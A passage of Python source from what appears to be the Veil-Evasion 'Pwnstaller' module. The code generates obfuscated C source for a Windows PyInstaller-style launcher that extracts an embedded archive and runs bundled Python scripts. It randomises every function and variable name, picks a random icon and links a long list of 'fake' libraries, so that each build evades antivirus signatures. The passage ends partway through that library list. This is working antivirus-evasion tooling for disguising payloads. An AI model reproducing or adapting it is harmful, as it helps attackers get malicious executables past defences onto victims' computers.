    code += "static int createTempPath(ARCHIVE_STATUS *%s) {\n" %(statusName)
    code += "char *%s;\n" %(pName)
    code += "if (%s->temppath[0] == '\\0') {\n" %(statusName)
    code += "    if (!getTempPath(%s->temppath)) {return -1;}\n" %(statusName)
    code += "    strcpy(%s->temppathraw, %s->temppath);\n" %(statusName, statusName)
    code += "    for ( %s=%s->temppath; *%s; %s++ ) if (*%s == '\\\\') *%s = '/';}\n" %(pName, statusName, pName, pName, pName, pName)
    code += "return 0;}\n"


    # extract2fs()
    statusName = helpers.randomString()
    ptocName = helpers.randomString()
    outName = helpers.randomString()
    dataName = helpers.randomString()
    code += "int extract2fs(ARCHIVE_STATUS *%s, TOC *%s) {\n" %(statusName, ptocName)
    code += "FILE *%s; unsigned char *%s = extract(%s, %s);\n" %(outName, dataName, statusName, ptocName)
    code += "if (createTempPath(%s) == -1){ return -1; }\n" %(statusName)
    code += "%s = openTarget(%s->temppath, %s->name);\n" %(outName, statusName, ptocName)
    code += "if (%s == NULL)  { return -1; }\n" %(outName)
    code += "else { fwrite(%s, ntohl(%s->ulen), 1, %s); fclose(%s); }\n" %(dataName, ptocName, outName, outName)
    code += "free(%s); return 0; }\n" %(dataName)


    # splitName()
    pathName = helpers.randomString()
    filenameName = helpers.randomString()
    itemName = helpers.randomString()
    nameName = helpers.randomString()
    code += "static int splitName(char *%s, char *%s, const char *%s) {\n" %(pathName, filenameName, itemName)
    code += "char %s[_MAX_PATH + 1];\n" %(nameName)
    code += "strcpy(%s, %s);\n" %(nameName, itemName)
    code += "strcpy(%s, strtok(%s, \":\"));\n" %(pathName, nameName)
    code += "strcpy(%s, strtok(NULL, \":\")) ;\n" %(filenameName)
    code += "if (%s[0] == 0 || %s[0] == 0) return -1;\n" %(pathName, filenameName)
    code += "return 0; }\n"


    # copyFile()
    srcName = helpers.randomString()
    dstName = helpers.randomString()
    filenameName = helpers.randomString()
    inName = helpers.randomString()
    outName = helpers.randomString()
    code += "static int copyFile(const char *%s, const char *%s, const char *%s) {\n" %(srcName, dstName, filenameName)
    code += "FILE *%s = fopen(%s, \"rb\"); FILE *%s = openTarget(%s, %s);\n" %(inName, srcName, outName, dstName, filenameName)
    code += "char buf[4096]; int error = 0;\n"
    code += "if (%s == NULL || %s == NULL) return -1;\n" %(inName, outName)
    code += "while (!feof(%s)) {\n" %(inName)
    code += "    if (fread(buf, 4096, 1, %s) == -1) {\n" %(inName)
    code += "        if (ferror(%s)) { clearerr(%s); error = -1; break; }\n" %(inName, inName)
    code += "    } else {\n"
    code += "        fwrite(buf, 4096, 1, %s);\n" %(outName)
    code += "        if (ferror(%s)) { clearerr(%s); error = -1; break;}}}\n" %(outName, outName)
    code += "fclose(%s); fclose(%s); return error; }\n" %(inName, outName)


    # dirName()
    fullpathName = helpers.randomString()
    matchName = helpers.randomString()
    pathnameName = helpers.randomString()
    code += "static char *dirName(const char *%s) {\n" %(fullpathName)
    code += "char *%s = strrchr(%s, '\\\\');\n" %(matchName, fullpathName)
    code += "char *%s = (char *) calloc(_MAX_PATH, sizeof(char));\n" %(pathnameName)
    code += "if (%s != NULL) strncpy(%s, %s, %s - %s + 1);\n" %(matchName, pathnameName, fullpathName, matchName, fullpathName)
    code += "else strcpy(%s, %s);\n" %(pathnameName, fullpathName)
    code += "return %s; }\n" %(pathnameName)


    # copyDependencyFromDir()
    statusName = helpers.randomString()
    srcpathName = helpers.randomString()
    filenameString = helpers.randomString()
    code += "static int copyDependencyFromDir(ARCHIVE_STATUS *%s, const char *%s, const char *%s){\n" %(statusName, srcpathName, filenameString)
    code += "if (createTempPath(%s) == -1){ return -1; }\n" %(statusName)
    code += "if (copyFile(%s, %s->temppath, %s) == -1) { return -1; }\n" %(srcpathName, statusName, filenameString)
    code += "return 0; }\n"


    # get_archive()
    statusName = helpers.randomString()
    pathName = helpers.randomString()
    status_listName = helpers.randomString()
    code += "static ARCHIVE_STATUS *get_archive(ARCHIVE_STATUS *%s[], const char *%s) {\n" %(status_listName, pathName)
    code += "ARCHIVE_STATUS *%s = NULL; int i = 0;\n" %(statusName)
    code += "if (createTempPath(%s[SELF]) == -1){ return NULL; } \n" %(status_listName)
    code += "for (i = 1; %s[i] != NULL; i++){ if (strcmp(%s[i]->archivename, %s) == 0) { return %s[i]; } }\n" %(status_listName, status_listName, pathName, status_listName)
    code += "if ((%s = (ARCHIVE_STATUS *) calloc(1, sizeof(ARCHIVE_STATUS))) == NULL) { return NULL; }\n" %(statusName)
    code += "strcpy(%s->archivename, %s);\n" %(statusName, pathName)
    code += "strcpy(%s->homepath, %s[SELF]->homepath);\n" %(statusName, status_listName)
    code += "strcpy(%s->temppath, %s[SELF]->temppath);\n" %(statusName, status_listName)
    code += "strcpy(%s->homepathraw, %s[SELF]->homepathraw);\n" %(statusName, status_listName)
    code += "strcpy(%s->temppathraw, %s[SELF]->temppathraw);\n" %(statusName, status_listName)
    code += "if (openArchive(%s)) { free(%s); return NULL; }\n" %(statusName, statusName)
    code += "%s[i] = %s; return %s; }\n" %(status_listName, statusName, statusName)


    # extractDependencyFromArchive()
    statusName = helpers.randomString()
    filenameName = helpers.randomString()
    ptocName = helpers.randomString()
    code += "static int extractDependencyFromArchive(ARCHIVE_STATUS *%s, const char *%s) {\n" %(statusName, filenameName)
    code += "TOC * %s = %s->tocbuff;\n" %(ptocName, statusName)
    code += "while (%s < %s->tocend) {\n" %(ptocName, statusName)
    code += "    if (strcmp(%s->name, %s) == 0) if (extract2fs(%s, %s)) return -1;\n" %(ptocName, filenameName, statusName, ptocName)
    code += "    %s = incrementTocPtr(%s, %s); }\n" %(ptocName, statusName, ptocName)
    code += "return 0; }\n"


    # extractDependency()
    statusName = helpers.randomString()
    status_listName = helpers.randomString()
    itemName = helpers.randomString()
    pathName = helpers.randomString()
    filenameName = helpers.randomString()
    archive_pathName = helpers.randomString()
    dirnameName = helpers.randomString()
    code += "static int extractDependency(ARCHIVE_STATUS *%s[], const char *%s) {\n" %(status_listName, itemName)
    code += "ARCHIVE_STATUS *%s = NULL;\n" %(statusName)
    code += "char %s[_MAX_PATH + 1]; char %s[_MAX_PATH + 1];\n" %(pathName, filenameName)
    code += "char %s[_MAX_PATH + 1]; char *%s = NULL;\n" %(archive_pathName, dirnameName)
    code += "if (splitName(%s, %s, %s) == -1) return -1;\n" %(pathName, filenameName, itemName)
    code += "%s = dirName(%s);\n" %(dirnameName, pathName)
    code += "if (%s[0] == 0) { free(%s); return -1; }\n" %(dirnameName, dirnameName)
    code += "if ((checkFile(%s, \"%%s%%s.pkg\", %s[SELF]->homepath, %s) != 0) &&\n" %(archive_pathName, status_listName, pathName)
    code += "    (checkFile(%s, \"%%s%%s.exe\", %s[SELF]->homepath, %s) != 0) &&\n" %(archive_pathName, status_listName, pathName)
    code += "    (checkFile(%s, \"%%s%%s\", %s[SELF]->homepath, %s) != 0)) { return -1; }\n" %(archive_pathName, status_listName, pathName)
    code += "    if ((%s = get_archive(%s, %s)) == NULL) { return -1; }\n" %(statusName, status_listName, archive_pathName)
    code += "if (extractDependencyFromArchive(%s, %s) == -1) { free(%s); return -1; }\n" %(statusName, filenameName, statusName)
    code += "free(%s); return 0; }\n" %(dirnameName)


    # needToExtractBinaries()
    status_listName = helpers.randomString()
    ptocName = helpers.randomString()
    code += "int needToExtractBinaries(ARCHIVE_STATUS *%s[]) {\n" %(status_listName)
    code += "TOC * %s = %s[SELF]->tocbuff;\n" %(ptocName, status_listName)
    code += "while (%s < %s[SELF]->tocend) {\n" %(ptocName, status_listName)
    code += "    if (%s->typcd == 'b' || %s->typcd == 'x' || %s->typcd == 'Z') return 1;\n" %(ptocName, ptocName, ptocName)
    code += "    if (%s->typcd == 'd')  return 1;\n" %(ptocName)
    code += "    %s = incrementTocPtr(%s[SELF], %s);\n" %(ptocName, status_listName, ptocName)
    code += "} return 0; }\n"


    # extractBinaries()
    status_listName = helpers.randomString()
    ptocName = helpers.randomString()
    code += "int extractBinaries(ARCHIVE_STATUS *%s[]) {\n" %(status_listName)
    code += "TOC * %s = %s[SELF]->tocbuff;\n" %(ptocName, status_listName)
    code += "while (%s < %s[SELF]->tocend) {\n" %(ptocName, status_listName)
    code += "    if (%s->typcd == 'b' || %s->typcd == 'x' || %s->typcd == 'Z')\n" %(ptocName, ptocName, ptocName)
    code += "        if (extract2fs(%s[SELF], %s)) return -1;\n" %(status_listName, ptocName)
    code += "    if (%s->typcd == 'd') {\n" %(ptocName)
    code += "        if (extractDependency(%s, %s->name) == -1) return -1; }\n" %(status_listName, ptocName)
    code += "    %s = incrementTocPtr(%s[SELF], %s); }\n" %(ptocName, status_listName, ptocName)
    code += "return 0; }\n"


    # runScripts()
    statusName = helpers.randomString()
    dataName = helpers.randomString()
    bufName = helpers.randomString()
    rcName = helpers.randomString()
    ptocName = helpers.randomString()
    code += "int runScripts(ARCHIVE_STATUS *%s) {\n" %(statusName)
    code += "unsigned char *%s; char %s[_MAX_PATH]; int %s = 0;\n" %(dataName, bufName, rcName)
    code += "TOC * %s = %s->tocbuff;\n" %(ptocName, statusName)
    code += "PyObject *__main__ = PI_PyImport_AddModule(\"__main__\"); PyObject *__file__;\n"
    code += "while (%s < %s->tocend) {\n" %(ptocName, statusName)
    code += "    if (%s->typcd == 's') {\n" %(ptocName)
    code += "        %s = extract(%s, %s);\n" %(dataName, statusName, ptocName)
    code += "        strcpy(%s, %s->name); strcat(%s, \".py\");\n" %(bufName, ptocName, bufName)
    code += "        __file__ = PI_PyString_FromStringAndSize(%s, strlen(%s));\n" %(bufName, bufName)
    code += "        PI_PyObject_SetAttrString(__main__, \"__file__\", __file__); Py_DECREF(__file__);\n"
    code += "        %s = PI_PyRun_SimpleString(%s);\n" %(rcName, dataName) 
    code += "        if (%s != 0) return %s; free(%s); }\n" %(rcName, rcName, dataName)
    code += "    %s = incrementTocPtr(%s, %s);\n" %(ptocName, statusName, ptocName)
    code += "} return 0; }\n"


    # init()
    statusName = helpers.randomString()
    archivePathName = helpers.randomString()
    archiveNameName = helpers.randomString()
    code += "int init(ARCHIVE_STATUS *%s, char const * %s, char  const * %s) {\n" %(statusName, archivePathName, archiveNameName)
    code += "if (setPaths(%s, %s, %s)) return -1;\n" %(statusName, archivePathName, archiveNameName)
    code += "if (openArchive(%s)) return -1;\n" %(statusName)
    code += "return 0; }\n"


    # doIt()
    statusName = helpers.randomString()
    rcName = helpers.randomString()
    code += "int doIt(ARCHIVE_STATUS *%s, int argc, char *argv[]) {\n" %(statusName)
    code += "int %s = 0;\n" %(rcName)
    code += "if (loadPython(%s)) return -1;\n" %(statusName)
    code += "if (startPython(%s, argc, argv)) return -1;\n" %(statusName)
    code += "if (importModules(%s)) return -1;\n" %(statusName)
    code += "if (installZlibs(%s)) return -1;\n" %(statusName)
    code += "%s = runScripts(%s);\n" %(rcName, statusName)
    code += "return %s; }\n" %(rcName)


    # clear() dec
    code += "void clear(const char *%s);\n" %(helpers.randomString())


    # removeOne()
    fnmName = helpers.randomString()
    posName = helpers.randomString()
    finfoName = helpers.randomString()
    code += "void removeOne(char *%s, int %s, struct _finddata_t %s) {\n" %(fnmName, posName, finfoName)
    code += "if ( strcmp(%s.name, \".\")==0  || strcmp(%s.name, \"..\") == 0 ) return;\n" %(finfoName, finfoName)
    code += "%s[%s] = '\\0';\n" %(fnmName, posName)
    code += "strcat(%s, %s.name);\n" %(fnmName, finfoName)
    code += "if ( %s.attrib & _A_SUBDIR ) clear(%s);\n" %(finfoName, fnmName)
    code += " else if (remove(%s)) { Sleep(100); remove(%s); } }\n" %(fnmName, fnmName)


    # clear()
    dirName = helpers.randomString()
    fnmName = helpers.randomString()
    finfoName = helpers.randomString()
    hName = helpers.randomString()
    dirnmlenName = helpers.randomString()
    code += "void clear(const char *%s) {\n" %(dirName)
    code += "char %s[_MAX_PATH+1]; struct _finddata_t %s;\n" %(fnmName, finfoName)
    code += "long %s; int %s; strcpy(%s, %s);\n" %(hName, dirnmlenName, fnmName, dirName)
    code += "%s = strlen(%s);\n" %(dirnmlenName, fnmName)
    code += "if ( %s[%s-1] != '/' && %s[%s-1] != '\\\\' ) { strcat(%s, \"\\\\\"); %s++; }\n" %(fnmName, dirnmlenName, fnmName, dirnmlenName, fnmName, dirnmlenName)
    code += "strcat(%s, \"*\");\n" %(fnmName)
    code += "%s = _findfirst(%s, &%s);\n" %(hName, fnmName, finfoName)
    code += "if (%s != -1) {\n" %(hName)
    code += "    removeOne(%s, %s, %s);\n" %(fnmName, dirnmlenName, finfoName)
    code += "    while ( _findnext(%s, &%s) == 0 ) removeOne(%s, %s, %s);\n" %(hName, finfoName, fnmName, dirnmlenName, finfoName)
    code += "    _findclose(%s); }\n" %(hName)
    code += "rmdir(%s); }\n" %(dirName)


    # cleanUp()
    statusName = helpers.randomString()
    code += "void cleanUp(ARCHIVE_STATUS *%s) { if (%s->temppath[0]) clear(%s->temppath); }\n" %(statusName, statusName, statusName)


    # getPyVersion()
    statusName = helpers.randomString()
    code += "int getPyVersion(ARCHIVE_STATUS *%s) { return ntohl(%s->cookie.pyvers); }\n" %(statusName, statusName)


    # finalizePython()
    code += "void finalizePython(void) { PI_Py_Finalize(); } \n"

    return (allincludes, code)


def pwnstallerGenerateLaunchH(methodSubs):
    """
    Generate obfuscated version of Pwnstaller's launch.h
    """
    code = "#ifndef LAUNCH_H\n"
    code += "#define LAUNCH_H\n"
    code += "#include <stdio.h>\n"
    code += "#include <string.h>\n"
    code += "#include <stdlib.h>\n"
    code += "#include <io.h>\n"
    code += "#include <fcntl.h>\n"
    code += "#include <winsock.h>\n"
    code += "#define EXTDECLPROC(result, name, args) typedef result (__cdecl *__PROC__##name) args; extern __PROC__##name PI_##name;\n"
    code += "#define EXTDECLVAR(vartyp, name) typedef vartyp __VAR__##name; extern __VAR__##name *PI_##name;\n"
    code += "struct _object;\n"
    code += "typedef struct _object PyObject;\n"
    code += "struct _PyThreadState;\n"
    code += "typedef struct _PyThreadState PyThreadState;\n"
    code += "EXTDECLVAR(int, Py_FrozenFlag);\n"
    code += "EXTDECLVAR(int, Py_NoSiteFlag);\n"
    code += "EXTDECLPROC(int, Py_Initialize, (void));\n"
    code += "EXTDECLPROC(int, Py_Finalize, (void));\n"
    code += "EXTDECLPROC(void, Py_IncRef, (PyObject *));\n"
    code += "EXTDECLPROC(void, Py_DecRef, (PyObject *));\n"
    code += "EXTDECLPROC(PyObject *, PyImport_ExecCodeModule, (char *, PyObject *));\n"
    code += "EXTDECLPROC(int, PyRun_SimpleString, (char *));\n"
    code += "EXTDECLPROC(void, Py_SetProgramName, (char *));\n"
    code += "EXTDECLPROC(PyObject *, PyImport_ImportModule, (char *));\n"
    code += "EXTDECLPROC(PyObject *, PyImport_AddModule, (char *));\n"
    code += "EXTDECLPROC(int, PyObject_SetAttrString, (PyObject *, char *, PyObject *));\n"
    code += "EXTDECLPROC(PyObject *, PyList_New, (int));\n"
    code += "EXTDECLPROC(int, PyList_Append, (PyObject *, PyObject *));\n"
    code += "EXTDECLPROC(PyObject *, Py_BuildValue, (char *, ...));\n"
    code += "EXTDECLPROC(PyObject *, PyString_FromStringAndSize, (const char *, int));\n"
    code += "EXTDECLPROC(char *, PyString_AsString, (PyObject *));\n"
    code += "EXTDECLPROC(PyObject *, PyObject_CallFunction, (PyObject *, char *, ...));\n"
    code += "EXTDECLPROC(PyObject *, PyModule_GetDict, (PyObject *));\n"
    code += "EXTDECLPROC(PyObject *, PyDict_GetItemString, (PyObject *, char *));\n"
    code += "EXTDECLPROC(void, PyErr_Clear, (void) );\n"
    code += "EXTDECLPROC(PyObject *, PyErr_Occurred, (void) );\n"
    code += "EXTDECLPROC(void, PyErr_Print, (void) );\n"
    code += "EXTDECLPROC(PyObject *, PyObject_CallMethod, (PyObject *, char *, char *, ...) );\n"
    code += "EXTDECLPROC(void, Py_EndInterpreter, (PyThreadState *) );\n"
    code += "EXTDECLPROC(long, PyInt_AsLong, (PyObject *) );\n"
    code += "EXTDECLPROC(int, PySys_SetObject, (char *, PyObject *));\n"
    code += "#define Py_XINCREF(o)    PI_Py_IncRef(o)\n"
    code += "#define Py_XDECREF(o)    PI_Py_DecRef(o)\n"
    code += "#define Py_DECREF(o)     Py_XDECREF(o)\n"
    code += "#define Py_INCREF(o)     Py_XINCREF(o)\n"
    code += "#define DECLPROC(name) __PROC__##name PI_##name = NULL;\n"
    code += "#define GETPROCOPT(dll, name) PI_##name = (__PROC__##name)GetProcAddress (dll, #name)\n"
    code += "#define GETPROC(dll, name) GETPROCOPT(dll, name); if (!PI_##name) { return -1;}\n"
    code += "#define DECLVAR(name) __VAR__##name *PI_##name = NULL;\n"
    code += "#define GETVAR(dll, name) PI_##name = (__VAR__##name *)GetProcAddress (dll, #name); if (!PI_##name) { return -1;}\n"
    code += "#define MAGIC \"MEI\\014\\013\\012\\013\\016\"\n"
    code += "# define FATALERROR mbfatalerror\n"
    code += "# define OTHERERROR mbothererror\n"
    code += "#ifndef _MAX_PATH\n"
    code += "#define _MAX_PATH 256\n"
    code += "#endif\n"
    code += "#define SELF 0\n"

    code += "typedef struct _toc { int structlen; int pos; int len; int ulen; char cflag; char typcd; char name[1]; } TOC;\n"
    code += "typedef struct _cookie { char magic[8]; int len; int TOC; int TOClen; int pyvers; } COOKIE;\n"
    code += "typedef struct _archive_status {\n"
    code += "    FILE *fp; int pkgstart; TOC *tocbuff; TOC *tocend; COOKIE cookie;\n"
    code += "    char archivename[_MAX_PATH + 1]; char homepath[_MAX_PATH + 1];\n"
    code += "    char temppath[_MAX_PATH + 1]; char homepathraw[_MAX_PATH + 1];\n"
    code += "    char temppathraw[_MAX_PATH + 1];} ARCHIVE_STATUS;\n"
    code += "int init(ARCHIVE_STATUS *%s, char const * %s, char  const * %s);\n" %(helpers.randomString(), helpers.randomString(), helpers.randomString())
    code += "int extractBinaries(ARCHIVE_STATUS *%s[]);\n" %(helpers.randomString())
    code += "int doIt(ARCHIVE_STATUS *%s, int %s, char *%s[]);\n" %(helpers.randomString(), helpers.randomString(), helpers.randomString())
    code += "int callSimpleEntryPoint(char *%s, int *%s);\n" %(helpers.randomString(), helpers.randomString())
    code += "void cleanUp(ARCHIVE_STATUS *%s);\n" %(helpers.randomString())
    code += "int getPyVersion(ARCHIVE_STATUS *%s);\n" %(helpers.randomString())
    code += "void finalizePython(void);\n"
    code += "int setPaths(ARCHIVE_STATUS *%s, char const * %s, char const * %s);\n" %(helpers.randomString(), helpers.randomString(), helpers.randomString())
    code += "int openArchive(ARCHIVE_STATUS *%s);\n" %(helpers.randomString())
    code += "int attachPython(ARCHIVE_STATUS *%s, int *%s);\n" %(helpers.randomString(), helpers.randomString())
    code += "int loadPython(ARCHIVE_STATUS *%s);\n" %(helpers.randomString())
    code += "int startPython(ARCHIVE_STATUS *%s, int %s, char *%s[]);\n" %(helpers.randomString(), helpers.randomString(), helpers.randomString())
    code += "int importModules(ARCHIVE_STATUS *%s);\n" %(helpers.randomString())
    code += "int installZlibs(ARCHIVE_STATUS *%s);\n" %(helpers.randomString())
    code += "int runScripts(ARCHIVE_STATUS *%s);\n" %(helpers.randomString())
    code += "TOC *getFirstTocEntry(ARCHIVE_STATUS *%s);\n" %(helpers.randomString())
    code += "TOC *getNextTocEntry(ARCHIVE_STATUS *%s, TOC *%s);\n" %(helpers.randomString(), helpers.randomString())
    code += "void clear(const char *%s);\n" %(helpers.randomString())
    code += "#endif\n"

    # replace all method names with their randomized choices from the passed list
    for m in methodSubs: code = code.replace(m[0], m[1])

    return code


def pwnstallerGenerateRunwrc():
    """
    Generate Pwnstaller's runw.rc code
    """
    code = "#include \"resource.h\"\n"
    code += "#define APSTUDIO_READONLY_SYMBOLS\n"
    code += "#include \"windows.h\"\n"
    code += "#undef APSTUDIO_READONLY_SYMBOLS\n"
    code += "#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)\n"
    code += "#ifdef _WIN32\n"
    code += "LANGUAGE LANG_NEUTRAL, SUBLANG_NEUTRAL\n"

    # TODO: can this safely be randomized?
    code += "#pragma code_page(1252)\n"
    code += "#endif\n"

    # get a random icon
    # Creative Commons icons from https://www.iconfinder.com/search/?q=iconset%3Aflat-ui-icons-24-px
    #   license - http://creativecommons.org/licenses/by/3.0/
    iconPath = settings.VEIL_EVASION_PATH + "/modules/common/source/icons/"
    code += "IDI_ICON1               ICON    DISCARDABLE     \"./icons/%s\"\n" %(random.choice(os.listdir(iconPath)))
    code += "#endif\n"

    return code


def pwnstallerBuildSource():
    """
    Build all the obfuscated Pwnstaller source files.
    """
    # all methods in util.c paired with a randomized name to substitute in
    util_methods = [    ('basename(',helpers.randomString()+"("), 
                        ('IsXPOrLater(',helpers.randomString()+"("), 
                        ('CreateActContext(',helpers.randomString()+"("), 
                        ('ReleaseActContext(',helpers.randomString()+"("), 
                        ('init_launcher(',helpers.randomString()+"("), 
                        ('get_thisfile(',helpers.randomString()+"("), 
                        ('get_thisfilew(',helpers.randomString()+"("), 
                        ('get_homepath(',helpers.randomString()+"("), 
                        ('get_archivefile(',helpers.randomString()+"("), 
                        ('set_environment(',helpers.randomString()+"("), 
                        ('spawn(',helpers.randomString()+"(")]


    # all methods in util.c paired with a randomized name to substitute in
    launch_methods = [  ("extract(", helpers.randomString()+"("),
                        ("getTempPath(", helpers.randomString()+"("),
                        ("checkFile(", helpers.randomString()+"("),
                        ("setPaths(", helpers.randomString()+"("),
                        ("checkCookie(", helpers.randomString()+"("),
                        ("openArchive(", helpers.randomString()+"("),
                        ("mapNames(", helpers.randomString()+"("),
                        ("loadPython(", helpers.randomString()+"("),
                        ("incrementTocPtr(", helpers.randomString()+"("),
                        ("startPython(", helpers.randomString()+"("),
                        ("importModules(", helpers.randomString()+"("),
                        ("installZlib(", helpers.randomString()+"("),
                        ("installZlibs(", helpers.randomString()+"("),
                        ("decompress(", helpers.randomString()+"("), 
                        ("extract(", helpers.randomString()+"("),
                        ("openTarget(", helpers.randomString()+"("),
                        ("createTempPath(", helpers.randomString()+"("),
                        ("extract2fs(", helpers.randomString()+"("),
                        ("splitName(", helpers.randomString()+"("),
                        ("copyFile(", helpers.randomString()+"("),
                        ("dirName(", helpers.randomString()+"("),
                        ("copyDependencyFromDir(", helpers.randomString()+"("),
                        ("get_archive(", helpers.randomString()+"("),
                        ("extractDependencyFromArchive(", helpers.randomString()+"("),
                        ("extractDependency(", helpers.randomString()+"("),
                        ("needToExtractBinaries(",helpers.randomString()+"("),
                        ("extractBinaries(", helpers.randomString()+"("),
                        ("runScripts(", helpers.randomString()+"("),
                        ("init(", helpers.randomString()+"("),
                        ("doIt(", helpers.randomString()+"("),
                        ("clear(", helpers.randomString()+"("),
                        ("removeOne(", helpers.randomString()+"("),
                        ("cleanUp(", helpers.randomString()+"("),
                        ("getPyVersion(", helpers.randomString()+"("),
                        ("finalizePython(", helpers.randomString()+"(")]

    # generate our utils.c source and utils.h declaration with
    # our randomized method name list
    (util_includes, util_source) = pwnstallerGenerateUtils()
    utils_h = pwnstallerGenerateUtilsH(util_methods)


    # generate our launch.c source and launch.h declaration with
    # our randomized method name list
    (launch_includes, launch_source) = pwnstallerGenerateLaunch()
    launch_h = pwnstallerGenerateLaunchH(launch_methods)


    # generate main.c, nothing to sub in here as there's only WinMain()
    (main_includes, main_source) = pwnstallerGenerateMain()


    # generate our .rc source with a randomized icon
    rc_source = pwnstallerGenerateRunwrc()


    # build the total.c source of all the main three files (utils.c, launch.c, main.c)
    totalSource = util_includes
    totalSource += main_includes
    totalSource += launch_includes
    totalSource += util_source
    totalSource += launch_source
    totalSource += main_source


    # patch in util method randomizations
    for m in util_methods: totalSource = totalSource.replace(m[0], m[1])

    # patch in launch method randomizations
    for m in launch_methods: totalSource = totalSource.replace(m[0], m[1])

    # write out the utils.h file
    f = open("./modules/common/source/common/utils.h", 'w')
    f.write(utils_h)
    f.close()

    # write out the launch.h file
    f = open("./modules/common/source/common/launch.h", 'w')
    f.write(launch_h)
    f.close()

    # write all the main logic out
    f = open("./modules/common/source/total.c", 'w')
    f.write(totalSource)
    f.close()

    # write out the resource declaration
    f = open("./modules/common/source/runw.rc", 'w')
    f.write(rc_source)
    f.close()


def pwnstallerCompileRunw():
    """
    Executes all the mingw32 commands needed to compile the new Pwnstaller Pwnstaller runw.exe
    """    
    libraries = []

    # "fake" libraries to include with compilation
    # taken from /usr/i686-w64-mingw32/lib/*
    fake_libraries = ['-laclui', '-ladvapi32', '-lapcups', '-lauthz', '-lavicap32', '-lavifil32', '-lbcrypt', '-lbootvid', '-lbthprops', '-lcap', '-lcfgmgr32', '-lclasspnp', '-lclfsw32', '-lclusapi', '-lcmutil', '-lcomctl32', '-lcomdlg32', '-lconnect', '-lcredui', '-lcrypt32', '-lcryptnet', '-lcryptsp', '-lcryptxml', '-lcscapi', '-lctl3d32', '-ld2d1', '-ld3d8', '-ld3d9', '-ld3dcompiler_33', '-ld3dcompiler_34', '-ld3dcompiler_35', '-ld3dcompiler_36', '-ld3dcompiler_37', '-ld3dcompiler_38', '-ld3dcompiler_39', '-ld3dcompiler_40', '-ld3dcompiler_41', '-ld3dcompiler_42', '-ld3dcompiler_43', '-ld3dcompiler', '-ld3dcsxd_43', '-ld3dcsxd', '-ld3dim', '-ld3drm', '-ld3dx10_33', '-ld3dx10_34', '-ld3dx10_35', '-ld3dx10_36', '-ld3dx10_37', '-ld3dx10_38', '-ld3dx10_39', '-ld3dx10_40', '-ld3dx10_41', '-ld3dx10_42', '-ld3dx10_43', '-ld3dx10', '-ld3dx11_42', '-ld3dx11_43', '-ld3dx11', '-ld3dx8d', '-ld3dx9_24', '-ld3dx9_25', '-ld3dx9_26', '-ld3dx9_27', '-ld3dx9_28', '-ld3dx9_29', '-ld3dx9_30', '-ld3dx9_31', '-ld3dx9_32', '-ld3dx9_33', '-ld3dx9_34', '-ld3dx9_35', '-ld3dx9_36', '-ld3dx9_37', '-ld3dx9_38', '-ld3dx9_39', '-ld3dx9_40', '-ld3dx9_41', '-ld3dx9_42', '-ld3dx9_43', '-ld3dx9', '-ld3dx9d', '-ld3dxof', '-ldavclnt', '-ldbgeng', '-ldbghelp', '-lddraw', '-ldelayimp', '-ldhcpcsvc6', '-ldhcpcsvc', '-ldhcpsapi', '-ldinput8', '-ldinput', '-ldlcapi', '-ldmoguids', '-ldnsapi', '-ldplayx', '-ldpnaddr', '-ldpnet', '-ldpnlobby', '-ldpvoice', '-ldsetup', '-ldsound', '-ldssec', '-ldwmapi', '-ldwrite', '-ldxapi', '-ldxerr8', '-ldxerr9', '-ldxgi', '-ldxguid', '-ldxva2', '-leapp3hst', '-leappcfg', '-leappgnui', '-leapphost', '-leappprxy', '-lesent', '-levr', '-lfaultrep', '-lfwpuclnt', '-lgdi32', '-lgdiplus', '-lglaux', '-lglu32', '-lglut32', '-lglut', '-lgmon', '-lgpapi', '-lgpedit', '-lgpprefcl', '-lgpscript', '-lgptext', '-lhal', '-lhid', '-lhidclass', '-lhidparse', '-lhttpapi', '-licmui', '-ligmpagnt', '-limagehlp', '-limm32', '-liphlpapi', '-liscsidsc', '-lkernel32', '-lks', '-lksproxy', '-lksuser', '-lktmw32', '-llargeint', '-llz32', '-lm', '-lmangle', '-lmapi32', '-lmcd', '-lmf', '-lmfcuia32', '-lmfplat', '-lmgmtapi', '-lmoldname', '-lmpr', '-lmprapi', '-lmqrt', '-lmsacm32', '-lmscms', '-lmsctfmonitor', '-lmsdmo', '-lmsdrm', '-lmshtml', '-lmshtmled', '-lmsi', '-lmsimg32', '-lmstask', '-lmswsock', '-lncrypt', '-lnddeapi', '-lndfapi', '-lndis', '-lnetapi32', '-lnewdev', '-lnormaliz', '-lntdll', '-lntdsapi', '-lntmsapi', '-lntoskrnl', '-lodbc32', '-lodbccp32', '-lole32', '-loleacc', '-loleaut32', '-lolecli32', '-loledlg', '-lolepro32', '-lolesvr32', '-lopengl32', '-lp2p', '-lp2pcollab', '-lp2pgraph', '-lpcwum', '-lpdh', '-lpdhui', '-lpenwin32', '-lpkpd32', '-lpowrprof', '-lpsapi', '-lpseh', '-lquartz', '-lqutil', '-lqwave', '-lrapi', '-lrasapi32', '-lrasdlg', '-lresutil', '-lrpcdce4', '-lrpcdiag', '-lrpchttp', '-lrpcns4', '-lrpcrt4', '-lrstrmgr', '-lrtm', '-lrtutils', '-lscrnsave', '-lscrnsavw', '-lscsiport', '-lsecur32', '-lsetupapi', '-lshell32', '-lshfolder', '-lshlwapi', '-lslc', '-lslcext', '-lslwga', '-lsnmpapi', '-lspoolss', '-lsspicli', '-lstrmiids', '-lsvrapi', '-lsxs', '-ltapi32', '-ltbs', '-ltdh', '-ltdi', '-ltxfw32', '-lurl', '-lusbcamd2', '-lusbcamd', '-lusbd', '-lusbport', '-luser32', '-luserenv', '-lusp10', '-luuid', '-luxtheme', '-lvdmdbg', '-lversion', '-lvfw32', '-lvideoprt', '-lvirtdisk', '-lvssapi', '-lvss_ps', '-lvsstrace', '-lwdsclient', '-lwdsclientapi', '-lwdscore', '-lwdscsl', '-lwdsimage', '-lwdstptc', '-lwdsupgcompl', '-lwdsutil', '-lwecapi', '-lwer', '-lwevtapi', '-lwevtfwd', '-lwin32k', '-lwin32spl', '-lwininet', '-lwinmm', '-lwinscard', '-lwinspool', '-lwinstrm', '-lwinusb', '-lwlanapi', '-lwlanui', '-lwlanutil', '-lwldap32', '-lwow32', '-lws2_32', '-lwsdapi', '-lwsnmp32', '-lwsock32', '-lwst', '-lwtsapi32', '-lx3daudio1_2', '-lx3daudio1_3', '-lx3daudio1_4', '-lx3daudio1_5', '-lx3daudio1_6', '-lx3daudio1_7', '-lx3daudio', '-lx3daudiod1_7', '-lxapofx1_0', '-lxapofx1_1', '-lxapofx1_2', '-lxapofx1_3', 